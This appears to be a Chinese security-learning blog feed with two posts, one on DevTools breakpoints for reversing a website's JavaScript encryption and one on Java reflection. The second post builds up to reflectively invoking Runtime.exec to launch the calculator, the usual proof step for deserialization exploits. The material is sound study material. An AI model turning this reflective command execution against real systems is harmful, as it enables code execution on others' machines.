    <content type="html"><![CDATA[<h1 id="js-逆向系列01-断点-方法栈"><a href="#js-逆向系列01-断点-方法栈" class="headerlink" title="js 逆向系列01-断点&amp;方法栈"></a>js 逆向系列01-断点&amp;方法栈</h1><p>如果一个网站存在加密，其大致的运行流程如下：<br><strong>网站代码运行时间轴</strong><br>1、加载 html<br>2、加载 js<br>3、运行 js 初始化<br>4、用户触发事件<br>5、调用 js<br>6、加密函数<br>7、给服务器发送信息（创建 XHR-send）<br>8、接收到服务器返回数据<br>9、执行 js 解密函数<br>10、刷新网页</p><h2 id="断点类型"><a href="#断点类型" class="headerlink" title="断点类型"></a>断点类型</h2><p>在 js 逆向调试中，一般有如下几种断点：</p><ul><li>DOM 断点</li><li>DOM 事件断点</li><li>XHR 断点</li><li>代码行断点（手动下断）</li><li>代码的断点 debugger（源码中写好的）</li><li>全局事件断点（浏览器事件断点）</li><li>异常捕获断点</li></ul><p>下面介绍几种常用的断点。</p><h3 id="DOM-断点"><a href="#DOM-断点" class="headerlink" title="DOM 断点"></a>DOM 断点</h3><p>DOM 断点执行的比较靠前，距离加密函数比较远，无法根据栈调用快速定位，并且需要在渲染的时候，属性发生改变，才能断住。<br>例如，下图中的 search 按钮，审查元素后，下一个 DOM 断点，此时点击 search 按钮，是无法断住的，但是在 DOM breakpoint 中是可以看到断点存在，就是因为属性为发生改变，无法断住。<br><img src="/2023/04/27/file-upload/240210122105072.png"></p><h3 id="DOM-事件断点"><a href="#DOM-事件断点" class="headerlink" title="DOM 事件断点"></a>DOM 事件断点</h3><p>如果 DOM 断点无法下断，可以用 DOM 事件下断，跟 DOM 断点特性一致，距离加密函数比较远，无法根据栈调用快速定位。<br>下断的方法如下：<br><img src="/2023/04/27/file-upload/240210122809158.png"><br>在审查元素之后，点击对应行，在右侧的 event listeners 窗口，取消勾选 ancestors all，只显示当前的事件监听器，接着点击对应的代码行跳入下断即可：<br><img src="/2023/04/27/file-upload/240210122914805.png"><br>DOM 断点和 DOM 事件断点，在时间轴的第四步，也就是用户触发事件的阶段。</p><h3 id="XHR-断点"><a href="#XHR-断点" class="headerlink" title="XHR 断点"></a>XHR 断点</h3><p>XHR 就是 XML HTTP REQUEST，XHR 断点是在 send 的阶段下断，即时间轴中的第七步，执行的比较靠后，距离加密函数比较近，可以根据栈快速定位。<br><strong>注意：非 XHR 发送的就断不住</strong><br>以下面的网站为例：<br><img src="/2023/04/27/file-upload/240210123408573.png"><br>随便输入一个手机号，查看其 http request 的 url 为 authcode&#x2F;，可以利用该 url 下一个 XHR 断点。<br><img src="/2023/04/27/file-upload/240210123553098.png"><br>在 source 窗口添加 XHR 断点，输入 url: &#x2F;autocode&#x2F;并勾选即可，下面再次发送验证码：<br><img src="/2023/04/27/file-upload/240210123652982.png"><br>点击发送，在 send 函数处卡住，成功断住。<br>借助这个例子也可以看一下方法栈的情况。<br><img src="/2023/04/27/file-upload/240210123741208.png"><br>在这里可以清楚看到完整的调用关系。</p><h3 id="全局事件断点（浏览器事件断点）"><a href="#全局事件断点（浏览器事件断点）" class="headerlink" title="全局事件断点（浏览器事件断点）"></a>全局事件断点（浏览器事件断点）</h3><p>在 source 界面，展开 event listener breakpoints，点击对应的事件下断即可。<br><img src="/2023/04/27/file-upload/240210124105285.png"></p><h3 id="异常捕获断点"><a href="#异常捕获断点" class="headerlink" title="异常捕获断点"></a>异常捕获断点</h3><p>有时候想要更清晰地了解 try catch 的异常处理，可以勾选 pause on caught exceptions，此时代码运行遇到异常时，不会进行 catch 块，而是会报错并且断住，方便分析，一般在跟环境时使用。<br><img src="/2023/04/27/file-upload/240210124258160.png"></p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java基础-反射</title>
    <link href="/2024/07/23/java%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84/"/>
    <url>/2024/07/23/java%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="java基础-反射"><a href="#java基础-反射" class="headerlink" title="java基础-反射"></a>java基础-反射</h1><h2 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Java反射就是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；并且能改变它的属性。而这也是Java被视为动态语言的一个关键性质。并且java反序列化也离不开java的反射机制。</p><h3 id="反射相关的类和方法"><a href="#反射相关的类和方法" class="headerlink" title="反射相关的类和方法"></a>反射相关的类和方法</h3><p>java.lang.Class：类对象</p><p>java.lang.reflect.Constructor：类的构造器对象</p><p>java.lang.reflect.Field：类的属性对象</p><p>java.lang.reflect.Method：类的方法对象</p><p>forName：获取类的方法</p><p>newInstance：实例化类对象的方法</p><p>getMethod：获取函数的方法</p><p>invoke：执行函数的方法</p><h3 id="反射的具体实现"><a href="#反射的具体实现" class="headerlink" title="反射的具体实现"></a>反射的具体实现</h3><h4 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h4><p>以Person类举例：</p><p><img src="/2023/04/27/file-upload/e-20230924110927896.png" alt="image-20230924110927896"></p><p>Person类可以通过new的方式直接创建一个实例，但是Class对象由于是private，因此无法直接new，一般使用下面三种方法进行实例化：</p><h5 id="实例化对象的getClass方法"><a href="#实例化对象的getClass方法" class="headerlink" title="实例化对象的getClass方法"></a>实例化对象的getClass方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> p1.getClass();<br></code></pre></td></tr></table></figure><h5 id="使用类的-class方法"><a href="#使用类的-class方法" class="headerlink" title="使用类的.class方法"></a>使用类的.class方法</h5><p><code>Class c1 = Person.class;</code></p><h5 id="Class-forName动态加载"><a href="#Class-forName动态加载" class="headerlink" title="Class.forName动态加载"></a>Class.forName动态加载</h5><p><code>Class c1 = Class.*forName*(&quot;Reflection.Person&quot;);</code></p><p>下面代码利用三种方式分别获取了类对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> p1.getClass();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Reflection.Person&quot;</span>);<br>        System.out.println(c1.getName());<br>        System.out.println(c2.getName());<br>        System.out.println(c3.getName());<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/e-20230924124125751.png" alt="image-20230924124125751"></p><h4 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h4><p>获取成员变量Field位于 <code>java.lang.reflect.Field</code> 包中</p><p>Field[] getFields() ：获取所有 public 修饰的成员变量</p><p>Field[] getDeclaredFields() ：获取所有的成员变量，不考虑修饰符</p><p>Field getField(String name) ：获取指定名称的 public 修饰的成员变量</p><p>Field getDeclaredField(String name)： 获取指定的成员变量</p><h4 id="获取成员方法Method"><a href="#获取成员方法Method" class="headerlink" title="获取成员方法Method"></a>获取成员方法Method</h4><p>Method getMethod(String name, 类&lt;?&gt;… parameterTypes) &#x2F;&#x2F;返回该类所声明的public方法</p><p>Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes) &#x2F;&#x2F;返回该类所声明的所有方法</p><p>Method[] getMethods() &#x2F;&#x2F;获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</p><p>Method[] getDeclaredMethods() &#x2F;&#x2F; 获取该类中的所有方法</p><p>下面以Person类为例，进行简单的代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>    &#125;<br>    <span class="hljs-comment">// 构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">(String s)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;学习中...&quot;</span> + s);<br>    &#125;<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">sleep</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;睡眠中...&quot;</span> + age);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;sleep&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Reflection.Person&quot;</span>);<br>        Method[] method1 = c1.getDeclaredMethods();<span class="hljs-comment">//所有方法</span><br>        Method[] method2 = c1.getMethods(); <span class="hljs-comment">//所有public方法</span><br>        <span class="hljs-keyword">for</span> (Method m : method1)&#123;<br>            System.out.println(m);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;--------------------------------&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Method m: method2)&#123;<br>            System.out.println(m);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;--------------------------------&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method3</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;study&quot;</span>, String.class);<span class="hljs-comment">//获取study方法，传参类型为String</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method4</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-type">int</span>.class);<span class="hljs-comment">//获取sleep方法，传参类型为int</span><br>        System.out.println(method3);<br>        System.out.println(<span class="hljs-string">&quot;--------------------------------&quot;</span>);<br>        System.out.println(method4);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/2023/04/27/file-upload/e-20230924130427741.png" alt="image-20230924130427741"></p><h4 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h4><p>Constructor&lt;?&gt;[] getConstructors() ：返回public构造函数</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</p><p>Constructor&lt;&gt; getConstructor(类&lt;?&gt;… parameterTypes) : 匹配和参数配型相符的public构造函数</p><p>Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;… parameterTypes) ： 匹配和参数配型相符的构造函数</p><p>同样看一下代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>    &#125;<br>    <span class="hljs-comment">// 构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Reflection.Person&quot;</span>);<br>        Constructor[] constructors1 = c1.getConstructors();<span class="hljs-comment">//获取public构造函数</span><br>        Constructor[] constructors2 = c1.getDeclaredConstructors();<span class="hljs-comment">//获取所有构造函数</span><br>        <span class="hljs-keyword">for</span> (Constructor c : constructors1)&#123;<br>            System.out.println(c);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;-----------------&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Constructor c : constructors2)&#123;<br>            System.out.println(c);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;-----------------&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor3</span> <span class="hljs-operator">=</span> c1.getConstructor();<br>        System.out.println(constructor3);<br>        System.out.println(<span class="hljs-string">&quot;-----------------&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor4</span> <span class="hljs-operator">=</span> c1.getConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        System.out.println(constructor4);<br>        System.out.println(<span class="hljs-string">&quot;-----------------&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor5</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(String.class);<br>        System.out.println(constructor5);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/2023/04/27/file-upload/e-20230924131303749.png" alt="image-20230924131303749"></p><h4 id="反射创建对象"><a href="#反射创建对象" class="headerlink" title="反射创建对象"></a>反射创建对象</h4><p>首先需要创建Class对象，再创建一个类对象：</p><p><img src="/2023/04/27/file-upload/e-20230924133453178.png" alt="image-20230924133453178"></p><p>最后再通过这个例子说明一下invoke方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>    &#125;<br>    <span class="hljs-comment">// 构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(String msg)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;show &quot;</span>+msg);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">static_show</span><span class="hljs-params">(String msg)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;static: show &quot;</span>+msg);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Reflection.Person&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> c1.newInstance();<br>        System.out.println(o.getClass());<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;show&quot;</span>, String.class);<br>        method.invoke(o,<span class="hljs-string">&quot;hello&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method1</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;static_show&quot;</span>, String.class);<br>        method1.invoke(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(),<span class="hljs-string">&quot;static hello&quot;</span>);    <br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/e-20230924134100856.png" alt="image-20230924134100856"></p><p>public Object invoke(Object obj, Object… args)，如果不是类方法，那么第一个参数就是类对象，后面是参数类型，如果是类方法，那么第一个参数就是类。即上图中method.invoke(o,”hello”)和method.invode(new Person(),”hello”)的区别。</p><h3 id="通过反射执行Runtime-getRuntime-exec"><a href="#通过反射执行Runtime-getRuntime-exec" class="headerlink" title="通过反射执行Runtime.getRuntime().exec()"></a>通过反射执行Runtime.<em>getRuntime</em>().exec()</h3><p>正常情况下，直接通过<code>Runtime.*getRuntime*().exec(&quot;calc&quot;);</code>执行即可。</p><p><img src="/2023/04/27/file-upload/e-20230924134520653.png" alt="image-20230924134520653"></p><p>如果通过反射来实现，则要相对复杂一些。</p><p>如果直接仿照前面的代码：</p><p><img src="/2023/04/27/file-upload/e-20230924134837782.png" alt="image-20230924134837782"></p><p>可以看到，java.lang.Runtime是private修饰，报错。</p><p>debug一下找原因：</p><p><img src="/2023/04/27/file-upload/e-20230925100904959.png" alt="image-20230925100904959"></p><p>这里的c1就是java.lang.Runtime，但是构造方法是private：</p><p><img src="/2023/04/27/file-upload/e-20230925100930513.png" alt="image-20230925100930513"></p><p>改为如下代码即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ReflectDemo;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalReflectionCalc</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">RuntimeMethod</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> RuntimeMethod.invoke(c1);  <br>        method.invoke(o1, <span class="hljs-string">&quot;calc.exe&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="进阶篇"><a href="#进阶篇" class="headerlink" title="进阶篇"></a>进阶篇</h2><h3 id="权限设置"><a href="#权限设置" class="headerlink" title="权限设置"></a>权限设置</h3><p>在一般情况下，使用反射机制不能对类的私有 <code>private</code> 字段进行操作，但是如果需要进行序列化操作，去访问这些受限的私有字段，这时可以通过调用 <code>setAccessible()</code> 方法来允许访问。</p><p><strong>这种方法与 <code>getConstructor</code> 配合使用</strong></p><p>还是以弹计算器为例：</p><p><img src="/2023/04/27/file-upload/e-20230924221707232.png" alt="image-20230924221707232"></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor();<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        c1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(constructor.newInstance(),<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里首先还是使用Class.forName动态加载实例化类对象，因为java.lang.Runtime是private，因此需要使用setAccessible，先获取其构造函数，再通过getMethod来获取到exec方法，最终通过invoke构造函数newInstance来实现计算器弹窗。</p><h3 id="反射修改字段"><a href="#反射修改字段" class="headerlink" title="反射修改字段"></a>反射修改字段</h3><h4 id="private"><a href="#private" class="headerlink" title="private"></a>private</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 